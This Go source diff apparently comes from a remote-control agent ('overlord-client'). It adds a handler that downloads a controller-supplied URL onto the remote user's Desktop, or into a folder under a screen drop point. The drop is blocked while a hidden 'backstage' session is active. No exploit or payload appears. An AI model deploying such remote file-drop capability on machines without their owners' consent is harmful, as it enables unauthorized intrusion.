@@ -26,6 +26,7 @@ import (
 	"time"
 	"unicode/utf8"
 
+	"overlord-client/cmd/agent/capture"
 	agentRuntime "overlord-client/cmd/agent/runtime"
 	agentTLS "overlord-client/cmd/agent/tlsconfig"
 	"overlord-client/cmd/agent/wire"
@@ -946,6 +947,89 @@ func HandleFileUploadHTTP(ctx context.Context, env *agentRuntime.Env, cmdID stri
 	}
 
 	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+}
+
+func desktopUploadPath(fileName string) (string, error) {
+	fileName = strings.TrimSpace(fileName)
+	if fileName == "" || fileName == "." || fileName == ".." || filepath.Base(fileName) != fileName || strings.ContainsAny(fileName, `/\\`) {
+		return "", errors.New("invalid desktop upload filename")
+	}
+	if strings.IndexFunc(fileName, func(r rune) bool { return r < 0x20 || r == 0x7f }) >= 0 {
+		return "", errors.New("invalid desktop upload filename")
+	}
+	homeDir, err := os.UserHomeDir()
+	if err != nil || strings.TrimSpace(homeDir) == "" {
+		return "", errors.New("unable to resolve the current user's home directory")
+	}
+	return filepath.Join(homeDir, "Desktop", fileName), nil
+}
+
+func desktopUploadTarget(fileName string, display int, x, y int32, hasDropPoint bool) (string, bool, int32, int32, error) {
+	destPath, err := desktopUploadPath(fileName)
+	if err != nil {
+		return "", false, 0, 0, err
+	}
+	if !hasDropPoint {
+		return destPath, false, 0, 0, nil
+	}
+	absX, absY := resolveDesktopPoint(display, x, y)
+	hit := capture.ResolveShellDropHit(absX, absY)
+	resolved, placeOnDesktop := desktopUploadTargetFromHit(destPath, fileName, hit)
+	return resolved, placeOnDesktop, absX, absY, nil
+}
+
+func desktopUploadTargetFromHit(destPath, fileName string, hit capture.ShellDropHit) (string, bool) {
+	directory := strings.TrimSpace(hit.Directory)
+	if directory == "" {
+		return destPath, hit.Desktop
+	}
+	if hit.ItemName != "" {
+		hovered := filepath.Join(directory, hit.ItemName)
+		if info, statErr := os.Stat(hovered); statErr == nil && info.IsDir() {
+			directory = hovered
+		}
+	}
+	return filepath.Join(directory, fileName), hit.Desktop && directory == filepath.Dir(destPath)
+}
+
+func HandleFileUploadDesktop(ctx context.Context, env *agentRuntime.Env, cmdID string, fileName string, sourceURL string, expectedSize int64, display int, x, y int32, hasDropPoint bool) error {
+	if remoteDesktopDropBlocked(env) {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
+			Type:      "command_result",
+			CommandID: cmdID,
+			OK:        false,
+			Message:   "remote desktop file drop is unavailable while backstage mode is active",
+		})
+	}
+	destPath, placeOnDesktop, absX, absY, err := desktopUploadTarget(fileName, display, x, y, hasDropPoint)
+	if err != nil {
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+	}
+	before, _ := os.Stat(destPath)
+	resultErr := HandleFileUploadHTTP(ctx, env, cmdID, destPath, sourceURL, expectedSize)
+	if placeOnDesktop {
+		after, statErr := os.Stat(destPath)
+		if statErr == nil && (before == nil || after.ModTime() != before.ModTime() || after.Size() != before.Size()) {
+			positionDesktopUpload(fileName, absX, absY)
+		}
+	}
+	return resultErr
+}
+
+func remoteDesktopDropBlocked(env *agentRuntime.Env) bool {
+	if env == nil {
+		return false
+	}
+	env.BackstageMu.Lock()
+	backstageActive := env.BackstageCancel != nil
+	env.BackstageMu.Unlock()
+	if backstageActive {
+		return true
+	}
+	env.VirtualMu.Lock()
+	virtualBackstageActive := env.VirtualCancel != nil
+	env.VirtualMu.Unlock()
+	return virtualBackstageActive
 }
 
 func sleepBackoff(ctx context.Context, d time.Duration) {
